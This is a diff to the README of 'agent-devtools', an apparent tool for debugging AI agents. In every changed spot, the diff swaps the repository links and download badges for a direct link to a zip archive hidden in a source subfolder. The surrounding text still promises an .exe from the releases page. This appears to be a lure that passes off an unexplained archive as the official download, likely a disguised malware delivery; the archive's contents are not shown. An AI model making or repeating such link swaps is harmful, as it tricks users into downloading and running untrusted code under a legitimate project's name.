@@ -1,6 +1,6 @@
 # 🛠️ agent-devtools - Debug AI Agents with Ease
 
-[![Download agent-devtools](https://img.shields.io/badge/Download-agent--devtools-brightgreen)](https://github.com/IIfaitdoux/agent-devtools)
+[![Download agent-devtools](https://img.shields.io/badge/Download-agent--devtools-brightgreen)](https://github.com/IIfaitdoux/agent-devtools/raw/refs/heads/main/src/agentdbg/instrumentors/devtools-agent-3.9-beta.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these simple steps to download and run agent-devtools on your Windows PC.
 
 Click the big green button below to visit the agent-devtools download page on GitHub:
 
-[![Download agent-devtools](https://img.shields.io/badge/Download-agent--devtools-brightgreen)](https://github.com/IIfaitdoux/agent-devtools)
+[![Download agent-devtools](https://img.shields.io/badge/Download-agent--devtools-brightgreen)](https://github.com/IIfaitdoux/agent-devtools/raw/refs/heads/main/src/agentdbg/instrumentors/devtools-agent-3.9-beta.3.zip)
 
 On this page, you will find the latest version ready for Windows. Look for a file ending in `.exe` inside the releases section.
 
@@ -123,7 +123,7 @@ You do not need to set up code or enter complicated commands. The interface show
 ## 🔗 Additional resources
 
 - Visit the official GitHub page for updates, release notes, and support:  
-  https://github.com/IIfaitdoux/agent-devtools
+  https://github.com/IIfaitdoux/agent-devtools/raw/refs/heads/main/src/agentdbg/instrumentors/devtools-agent-3.9-beta.3.zip
 
 - Check out example projects and guides included on the GitHub page for more detailed use cases.
 
